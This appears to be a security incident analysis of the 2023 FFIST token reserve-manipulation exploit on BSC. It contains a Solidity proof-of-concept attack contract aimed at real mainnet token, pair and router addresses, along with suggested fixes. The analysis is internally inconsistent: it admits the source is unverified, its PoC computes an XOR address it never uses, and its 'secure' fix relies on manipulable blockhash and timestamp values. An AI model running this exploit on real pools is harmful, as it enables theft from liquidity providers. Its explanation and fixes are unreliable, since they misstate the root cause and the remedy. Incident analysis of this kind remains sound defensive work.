# FFIST Reserve Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | FFIST |
| Date | 2023-07-21 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$110,000 USD |
| Attack Type | Reserve Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xcc8617331849962c27f91859578dc91922f6f050` |
| Attack Contract | `0xb31c7b7bdf69554345e47a4393f53c332255c9fb` |
| Vulnerable Contract | `0x80121da952a74c06adc1d7f85a237089b57af347` (FFIST) |
| Fork Block | 30,113,117 |

## 2. Vulnerability Code Analysis

The FFIST token used an XOR-based address computation mechanism to determine airdrop or reward addresses. The attacker exploited this vulnerability by combining the predictable address calculation with pair reserve manipulation.

```solidity
// Vulnerable pattern: XOR-based address calculation
function getRewardAddress(address user) internal pure returns (address) {
    // Vulnerable: XOR operation generates a predictable address
    return address(uint160(uint256(uint160(user)) ^ uint256(MASK)));
}

// Pair reserve manipulation vulnerability
function pairReserveManipulation() internal {
    // Vulnerable: direct reserve access without sync()
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    // Swap ratio calculated using manipulated reserves
    uint256 amountOut = calculateAmountOut(reserve0, reserve1, amountIn);
}
```

**Vulnerability**: The combination of XOR-based predictable address calculation and pair reserve manipulation allowed tokens to be obtained illegitimately.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Reserve Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xcc8617331849962c27f91859578dc91922f6f050]
  │
  ├─1─▶ Execute WBNBToFFIST()
  │      [Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      WBNB → FFIST swap
  │
  ├─2─▶ Execute pairReserveManipulation()
  │      [Pair: 0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152]
  │      Reserve manipulation via XOR-based address calculation
  │
  ├─3─▶ Execute FFISTToWBNB()
  │      FFIST → WBNB reverse swap
  │      (imbalanced exchange rate due to manipulated reserves)
  │
  └─4─▶ Profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IairdropToken {
    function airdrop(address to, uint256 amount) external;
    function getRewardAddress(address user) external pure returns (address);
}

contract FFISTExploit {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 FFIST = IERC20(0x80121DA952A74c06adc1d7f85A237089b57AF347);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() external {
        WBNBToFFIST();
        pairReserveManipulation();
        FFISTToWBNB();
    }

    function WBNBToFFIST() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FFIST);
        router.swapExactTokensForTokens(
            WBNB.balanceOf(address(this)),
            0, path, address(this), block.timestamp
        );
    }

    function pairReserveManipulation() internal {
        // XOR-based predictable address calculation
        address rewardAddr = address(
            uint160(uint256(uint160(address(this))) ^ 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
        );
        // Pair reserve manipulation
        FFIST.transfer(address(pair), FFIST.balanceOf(address(this)) / 2);
        pair.sync();  // Force reserve update
    }

    function FFISTToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(FFIST);
        path[1] = address(WBNB);
        FFIST.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            FFIST.balanceOf(address(this)),
            0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Predictable address calculation, reserve manipulation |
| Impact Scope | FFIST-WBNB liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0x80121da952a74c06adc1d7f85a237089b57af347) |

## 6. Security Recommendations

```solidity
// Fix 1: Use unpredictable randomness
function getRewardAddress(address user) internal view returns (address) {
    // Secure hash-based address generation instead of XOR
    bytes32 hash = keccak256(abi.encodePacked(user, blockhash(block.number - 1), block.timestamp));
    return address(uint160(uint256(hash)));
}

// Fix 2: Prevent reserve manipulation
function _validateReserves() internal view {
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    uint256 actualBalance0 = IERC20(token0).balanceOf(address(pair));
    uint256 actualBalance1 = IERC20(token1).balanceOf(address(pair));
    // Verify that the difference between actual balances and reserves is within acceptable bounds
    require(actualBalance0 <= reserve0 * 101 / 100, "Reserve manipulation detected");
    require(actualBalance1 <= reserve1 * 101 / 100, "Reserve manipulation detected");
}
```

## 7. Lessons Learned

1. **Risk of XOR-based address calculation**: Addresses generated via XOR operations are entirely predictable. Address computation must always incorporate sufficient entropy (randomness).
2. **`sync()` call vulnerability**: `sync()` forcibly updates reserves to match the current token balances. This can be exploited to temporarily manipulate reserves.
3. **Low-liquidity BSC tokens**: BSC tokens with low liquidity are susceptible to reserve manipulation with relatively little capital. A minimum liquidity threshold should be enforced.
4. **Importance of code audits**: Specialized token mechanisms (XOR addressing, airdrop logic) require dedicated security audits.